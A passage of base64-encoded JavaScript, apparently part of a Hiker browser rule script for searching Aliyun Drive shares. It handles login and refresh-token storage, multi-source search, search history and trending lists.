ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICBpZiAoXFxcIueZu+W9lei0puWPtzFcXFwiID09IGlucHV0KSB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9sb2dpbiNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/cGFnZVRpdGxlPeeZu+W9lemYv+mHjOS6keebmFxcXCJcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpZiAoXFxcIueZu+W9lei0puWPtzJcXFwiID09IGlucHV0KSB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9sb2dpbiNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/aW5kZXg9MCZwYWdlVGl0bGU955m75b2V6Zi/6YeM5LqR55uYXFxcIlxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlmIChcXFwiVG9rZW7nmbvlvZVcXFwiID09IGlucHV0KSB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJChcXFwiXFxcIiwgXFxcIui+k+WFpVRva2VuXFxcIikuaW5wdXQoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBhbGlUb2tlbnNGaWxlcGF0aCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3Rva2VuUGF0aFxcXCIpLmFsaVRva2Vuc0ZpbGVwYXRoO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBhbGlUb2tlbiA9IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaF90b2tlbjogaW5wdXQudHJpbSgpXFxuICAgICAgICAgICAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICAgICAgICAgICAgICB3cml0ZUZpbGUoYWxpVG9rZW5zRmlsZXBhdGgsIEpTT04uc3RyaW5naWZ5KGFsaVRva2VuKSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlmIChcXFwi55m75b2V5L+h5oGvXFxcIiA9PSBpbnB1dCkge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGFsaVRva2Vuc0ZpbGVwYXRoID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvdG9rZW5QYXRoXFxcIikuYWxpVG9rZW5zRmlsZXBhdGg7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoIWZpbGVFeGlzdChhbGlUb2tlbnNGaWxlcGF0aCkpIHJldHVybiBcXFwidG9hc3Q6Ly/ov5jmnKrnmbvpmYZcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGFsaSA9IHJlcXVlc3QoYWxpVG9rZW5zRmlsZXBhdGgpO1xcbiAgICAgICAgICAgICAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBhbGkgPSBKU09OLnBhcnNlKGFsaSk7XFxuICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlRmlsZShhbGlUb2tlbnNGaWxlcGF0aCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+iOt+WPluWksei0pVxcXCI7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ+eZu+W9leS/oeaBrycsXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudDogXFxcIueUqOaItzpcXFwiICsgKGFsaS5uaWNrX25hbWUgfHwgYWxpLnVzZXJfbmFtZSB8fCBcXFwiVG9rZW7nmbvlvZVcXFwiKSArIFxcXCJcXFxcblRva2VuOlxcXCIgKyBhbGkucmVmcmVzaF90b2tlbiArIFxcXCJcXFxcbijlj5bmtojvvJrms6jplIDnmbvlvZXvvJvnoa7lrprvvJrlpI3liLZUb2tlbilcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpcm06ICQudG9TdHJpbmcoKHRva2VuKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiY29weTovL1xcXCIgKyB0b2tlbjtcXG4gICAgICAgICAgICAgICAgICAgICAgICB9LCBhbGkucmVmcmVzaF90b2tlbiksXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FuY2VsOiAkLnRvU3RyaW5nKChwYXRoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkKFxcXCLnoa7orqTms6jplIDnmbvlvZVcXFwiKS5jb25maXJtKChwYXRoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVGaWxlKHBhdGgpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgcGF0aCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfSwgYWxpVG9rZW5zRmlsZXBhdGgpXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybjtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpbnB1dCA9IGlucHV0LnJlcGxhY2UoXFxcIuaooeW8j++8mlxcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFwib3Blbk1vZGVcXFwiLCBpbnB1dCk7XFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PSBcXFwi5a6Y5pa5QVBQXFxcIikge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+S/ruaUueaIkOWKn++8jOivt+ehruS/neaJi+acuuacieWuieijhemYv+mHjOS6keebmOWumOaWuUFQUFxcXCI7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSksXFxuICAgICAgICBjb2xfdHlwZTogXFxcImljb25fMl9yb3VuZFxcXCIsXFxuICAgICAgICBkZXNjOiBcXFwiXFxcIixcXG4gICAgICAgIHBpY191cmw6IFxcXCJoaWtlcjovL2ltYWdlcy9pY29uX21lbnU2XFxcIlxcbiAgICB9KTtcXG5cXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiAn5pCc57SiJyxcXG4gICAgICAgIGRlc2M6ICfor7fovpPlhaXlhbPplK7or40v6ZO+5o6lJyxcXG4gICAgICAgIGNvbF90eXBlOiAnaW5wdXQnLFxcbiAgICAgICAgdXJsOiAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICBpbnB1dCA9IGdldE15VmFyKFxcXCJzXFxcIiwgXFxcIlxcXCIpIHx8IGlucHV0O1xcbiAgICAgICAgICAgIGlucHV0ID0gaW5wdXQudHJpbSgpO1xcbiAgICAgICAgICAgIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXCJodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vcy9cXFwiKSkge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9hbGl5dW4/cGFnZVRpdGxlPeaJk+W8gOmTvuaOpSZwYWdlPWZ5cGFnZSZyZWFsdXJsPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBwdXRNeVZhcigncycsIGlucHV0KTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgICAgIH0pLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBvbkNoYW5nZTogXFxcInB1dE15VmFyKCdzJyxpbnB1dClcXFwiLFxcbiAgICAgICAgICAgIGlkOiBpZCArIFxcXCJzc1xcXCIsXFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBzXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBsZXQgcnVsZXMgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9kYXRhXFxcIikuZ2V0RGF0YSgpO1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCLwn4yfXFxcIixcXG4gICAgICAgIHVybDogXFxcImhpa2VyOi8vY29sbGVjdGlvbj9ydWxlPVxcXCIgKyBNWV9SVUxFLnRpdGxlLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJzY3JvbGxfYnV0dG9uXFxcIixcXG4gICAgfSwge1xcbiAgICAgICAgdGl0bGU6IFxcXCJcXFwiID09IHIgPyBcXFwi4oCc4oCc5YWo6YOo4oCd4oCdXFxcIiA6IFxcXCLlhajpg6hcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChzLCBpZCkgPT4ge1xcbiAgICAgICAgICAgIGxldCBxciA9IGdldEl0ZW0oXFxcInJ1bGVcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgY2xlYXJJdGVtKFxcXCJydWxlXFxcIik7XFxuICAgICAgICAgICAgaWYgKHMpIHtcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKFxcXCLlhajpg6hcXFwiICsgaWQsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc5YWo6YOo4oCd4oCdXFxcIlxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgaWYgKHFyKSB7XFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKGlkICsgcXIsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogcXJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgIH0sIHMsIGlkKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIGlkOiBcXFwi5YWo6YOoXFxcIiArIGlkXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBmb3IgKGxldCBpdCBvZiBydWxlcykge1xcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogaXQgPT0gciA/IFxcXCLigJzigJxcXFwiICsgaXQgKyBcXFwi4oCd4oCdXFxcIiA6IGl0LFxcbiAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgociwgcywgaWQpID0+IHtcXG4gICAgICAgICAgICAgICAgbGV0IHFyID0gZ2V0SXRlbShcXFwicnVsZVxcXCIsIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFwicnVsZVxcXCIsIHIpO1xcbiAgICAgICAgICAgICAgICBpZiAocykge1xcbiAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0ocXIgPyAoaWQgKyBxcikgOiAoXFxcIuWFqOmDqFxcXCIgKyBpZCksIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogcXIgfHwgXFxcIuWFqOmDqFxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShpZCArIHIsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnFxcXCIgKyByICsgXFxcIuKAneKAnVxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCJcXG4gICAgICAgICAgICB9LCBpdCwgcywgaWQpLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgZGVzYzogXFxcIlxcXCIsXFxuICAgICAgICAgICAgcGljX3VybDogXFxcIlxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IGlkICsgaXRcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfVxcblxcbn1cXG5cXG5mdW5jdGlvbiByZWNvcmQoKSB7XFxuICAgIGxldCBoaXN0b3J5ID0gc3RvcmFnZTAuZ2V0SXRlbShcXFwic2VhcmNoSGlzdG9yeVxcXCIsIFtdKTtcXG4gICAgbGV0IGlpID0gaGlzdG9yeS5pbmRleE9mKHMpO1xcbiAgICBpZiAoaWkgPiAtMSkge1xcbiAgICAgICAgaGlzdG9yeS5zcGxpY2UoaWksIDEpO1xcbiAgICB9XFxuICAgIGlmIChoaXN0b3J5Lmxlbmd0aCA+IDIwKSB7XFxuICAgICAgICBoaXN0b3J5LnNwbGljZShoaXN0b3J5Lmxlbmd0aCAtIDEsIDEpO1xcbiAgICB9XFxuICAgIGhpc3RvcnkudW5zaGlmdChzKTtcXG4gICAgc3RvcmFnZTAuc2V0SXRlbShcXFwic2VhcmNoSGlzdG9yeVxcXCIsIGhpc3RvcnkpO1xcbn1cXG5cXG5mdW5jdGlvbiBzZWFyY2hFbmQoKSB7XFxuICAgIGxldCBwID0gTVlfUEFHRTtcXG4gICAgbGV0IGRhdGEgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9kYXRhXFxcIikuZ2V0RGF0YShwLCByICE9IFxcXCJcXFwiID8gciA6IG51bGwpO1xcbiAgICBsZXQgcGFnZWlkID0gXFxcInlwai1wYWdlXFxcIiArIHA7XFxuICAgIGlmIChkYXRhLmxlbmd0aCA+IDApIHtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLliqDovb3nrKxcXFwiICsgcCArIFxcXCLpobXkuK3vvIzov5vluqbvvJoxL1xcXCIgKyBkYXRhLmxlbmd0aCxcXG4gICAgICAgICAgICB1cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgZGVzYzogXFxcIlxcXCIsXFxuICAgICAgICAgICAgcGljX3VybDogXFxcIlxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IHBhZ2VpZFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICB9XFxuICAgIHNldFJlc3VsdChkKTtcXG4gICAgaWYgKGRhdGEubGVuZ3RoID4gMCkge1xcbiAgICAgICAgLy/lpJrnur/nqIvliqDovb0gICAgICAgIFxcbiAgICAgICAgbGV0IHJlYWxQYWdlID0gXFxcIlxcXCIgPT0gciA/IDEgOiBwO1xcbiAgICAgICAgbGV0IHRhc2tzID0gZGF0YS5tYXAoaXQgPT4ge1xcbiAgICAgICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgICAgIGZ1bmM6IGZ1bmN0aW9uKHJ1bGUpIHtcXG4gICAgICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQucmVxdWlyZShcXFwiZGF0YVxcXCIpLmNhcnJ5UnVsZShydWxlLCBzLCByZWFsUGFnZSwgc2VhcmNoTW9kZSwgb3Blbk1vZGUpO1xcbiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhydWxlLm5hbWUgKyBcXFwiOlxcXCIgKyBlLnRvU3RyaW5nKCkpXFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAvL3JldHVybiBydWxlLmZpbmQocywgcmVhbFBhZ2UpO1xcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICBwYXJhbTogaXQsXFxuICAgICAgICAgICAgICAgIGlkOiBcXFwicnVsZUBcXFwiICsgaXQubmFtZVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcblxcbiAgICAgICAgYmF0Y2hFeGVjdXRlKHRhc2tzLCB7XFxuICAgICAgICAgICAgZnVuYzogZnVuY3Rpb24ocGFyYW0sIGlkLCBlcnJvciwgcmVzdWx0KSB7XFxuICAgICAgICAgICAgICAgIHBhcmFtLmkgKz0gMTtcXG4gICAgICAgICAgICAgICAgaWYgKEFycmF5LmlzQXJyYXkocmVzdWx0KSkge1xcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbShcXFwiX25vdGhhdmVcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgIGFkZEl0ZW1CZWZvcmUocGFnZWlkLCByZXN1bHQpO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlmIChwYXJhbS5pID09PSBwYXJhbS5hbGwpIHtcXG4gICAgICAgICAgICAgICAgICAgIGlmICghcmVzdWx0IHx8ICFyZXN1bHQubGVuZ3RoKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbShcXFwiX25vdGhhdmVcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBhZGRJdGVtQmVmb3JlKHBhZ2VpZCwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIn5+fuS7gOS5iOi1hOa6kOmDveayoeacieWTpn5+flxcXCIuZm9udGNvbG9yKFxcXCJHcmF5XFxcIiksXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogXFxcIl9ub3RoYXZlXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICBkZWxldGVJdGVtKHBhZ2VpZCk7XFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHBhZ2VpZCwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5Yqg6L2956ysXFxcIiArIE1ZX1BBR0UgKyBcXFwi6aG15Lit77yM6L+b5bqm77yaXFxcIiArIChwYXJhbS5pICsgMSkgKyBcXFwiL1xcXCIgKyBwYXJhbS5hbGwsXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICAgIHBhcmFtOiB7XFxuICAgICAgICAgICAgICAgIGFsbDogZGF0YS5sZW5ndGgsXFxuICAgICAgICAgICAgICAgIGk6IDAsXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSlcXG4gICAgfVxcbn1cXG5cXG5mdW5jdGlvbiBzZXRIaXN0b3J5KCkge1xcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICc8c3BhbiBzdHlsZT1cXFwiY29sb3I6I2ZmNjYwMVxcXCI+PGI+5Y6G5Y+y6K6w5b2VPC9iPjwvc3Bhbj4nLFxcbiAgICAgICAgcGljX3VybDogXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fY2xvY2tcXFwiLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJhdmF0YXJcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCLnoa7lrprmuIXpmaTlhajpg6jmkJzntKLorrDlvZXvvJ9cXFwiKS5jb25maXJtKChpZCkgPT4ge1xcbiAgICAgICAgICAgIGNsZWFySXRlbShcXFwic2VhcmNoSGlzdG9yeVxcXCIpO1xcbiAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhpZCArIFxcXCI6a2V5XFxcIik7XFxuICAgICAgICAgICAgYWRkSXRlbUFmdGVyKGlkICsgXFxcIjpzZWFyY2hIaXN0b3J5XFxcIiwge1xcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIn5+fuS7gOS5iOmDveayoeacieWTpn5+flxcXCIuZm9udGNvbG9yKFxcXCJHcmF5XFxcIiksXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBjbHM6IGlkICsgXFxcIjprZXlcXFwiXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0sIGlkKSxcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaWQ6IGlkICsgXFxcIjpzZWFyY2hIaXN0b3J5XFxcIlxcbiAgICAgICAgfVxcbiAgICB9KTtcXG5cXG4gICAgbGV0IGhpc3RvcnkgPSBzdG9yYWdlMC5nZXRJdGVtKFxcXCJzZWFyY2hIaXN0b3J5XFxcIiwgW10pO1xcbiAgICBsZXQgaSA9IDA7XFxuICAgIGZvciAobGV0IGtleSBvZiBoaXN0b3J5KSB7XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBrZXksXFxuICAgICAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChpZCwga2V5KSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCBleHRyYSA9IGZpbmRJdGVtKGlkICsgXFxcInNzXFxcIikuZXh0cmE7XFxuICAgICAgICAgICAgICAgIGV4dHJhLmRlZmF1bHRWYWx1ZSA9IGtleTtcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbSh7XFxuICAgICAgICAgICAgICAgICAgICBleHRyYTogZXh0cmFcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICAgICAgfSwgaWQsIGtleSksXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJmbGV4X2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IGlkICsgXFxcIjprZXk6XFxcIiArIGtleSxcXG4gICAgICAgICAgICAgICAgY2xzOiBpZCArIFxcXCI6a2V5XFxcIixcXG4gICAgICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLliKDpmaTlhbPplK7or406XFxcIiArIGtleSxcXG4gICAgICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKChpZCwga2V5LCBpKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGhpc3RvcnkgPSBzdG9yYWdlMC5nZXRJdGVtKFxcXCJzZWFyY2hIaXN0b3J5XFxcIiwgW10pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGhpc3Rvcnkuc3BsaWNlKGksIDEpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0oXFxcInNlYXJjaEhpc3RvcnlcXFwiLCBoaXN0b3J5KTtcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVJdGVtKGlkICsgXFxcIjprZXk6XFxcIiArIGtleSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgLy90b2FzdCgpO1xcbiAgICAgICAgICAgICAgICAgICAgfSwgaWQsIGtleSwgaSlcXG4gICAgICAgICAgICAgICAgfV1cXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgICAgIGkrKztcXG4gICAgfVxcbiAgICBpZiAoaGlzdG9yeS5sZW5ndGggPT09IDApIHtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnVxcXCIgKyBcXFwifn5+5LuA5LmI6YO95rKh5pyJ5ZOmfn5+XFxcIi5mb250Y29sb3IoXFxcIkdyYXlcXFwiKSxcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBjbHM6IGlkICsgXFxcIjprZXlcXFwiXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG59XFxuXFxuZnVuY3Rpb24gc2V0VHJlbmRpbmdUYWJFbmQoKSB7XFxuXFxuICAgIGxldCBob3RDbGFzcyA9IHtcXG4gICAgICAgIFxcXCLnmb7luqZcXFwiOiB7XFxuICAgICAgICAgICAgXFxcIueUteinhuWJp1xcXCI6IFxcXCJ0ZWxlcGxheVxcXCIsXFxuICAgICAgICAgICAgXFxcIueUteW9sVxcXCI6IFxcXCJtb3ZpZVxcXCJcXG4gICAgICAgIH0sXFxuICAgICAgICBcXFwi5aS45YWLXFxcIjoge1xcbiAgICAgICAgICAgIFxcXCLnlLXop4bliadcXFwiOiBcXFwi55S16KeG5YmnXFxcIixcXG4gICAgICAgICAgICBcXFwi55S15b2xXFxcIjogXFxcIueUteW9sVxcXCIsXFxuICAgICAgICAgICAgXFxcIuWKqOa8q1xcXCI6IFxcXCLliqjmvKtcXFwiLFxcbiAgICAgICAgICAgIFxcXCLnu7zoibpcXFwiOiBcXFwi57u86Im6XFxcIlxcbiAgICAgICAgfVxcbiAgICB9O1xcbiAgICBsZXQgZGF0YVNvdXJjZSA9IE9iamVjdC5rZXlzKGhvdENsYXNzKTtcXG4gICAgbGV0IHNlbGVjdHNvdXJjZSA9IGdldEl0ZW0oXFxcImRhdGFTb3VyY2VcXFwiLCBkYXRhU291cmNlWzBdKTtcXG4gICAgbGV0IGhvdGtleXMgPSBPYmplY3Qua2V5cyhob3RDbGFzc1tzZWxlY3Rzb3VyY2VdKTtcXG4gICAgbGV0IHNlbGVjdGtleSA9IGdldEl0ZW0oXFxcImhvdGtleVxcXCIsIGhvdGtleXNbMF0pO1xcbiAgICBsZXQgdGFia2V5ID0gaG90Q2xhc3Nbc2VsZWN0c291cmNlXVtzZWxlY3RrZXldO1xcblxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICc8c3BhbiBzdHlsZT1cXFwiY29sb3I6I2ZmNjYwMVxcXCI+PGI+JyArIHNlbGVjdHNvdXJjZSArIHNlbGVjdGtleSArICfng63mkJw8L2I+PC9zcGFuPicsXFxuICAgICAgICB1cmw6ICQoaG90a2V5cywgMSwgXFxcIuWIh+aNoueDreaQnFxcXCIpLnNlbGVjdCgoKSA9PiB7XFxuICAgICAgICAgICAgc2V0SXRlbShcXFwiaG90a2V5XFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5bey5YiH5o2i5Li6XFxcIiArIGlucHV0O1xcbiAgICAgICAgfSksXFxuICAgICAgICBjb2xfdHlwZTogXFxcImF2YXRhclxcXCIsXFxuICAgICAgICBwaWNfdXJsOiBcXFwiaGlrZXI6Ly9pbWFnZXMvaWNvbl9maXJlXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuWIh+aNouaVsOaNrua6kFxcXCIsXFxuICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKChkYXRhU291cmNlKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJChkYXRhU291cmNlLCAxLCBcXFwi5YiH5o2i5pWw5o2u5rqQXFxcIikuc2VsZWN0KCgpID0+IHtcXG4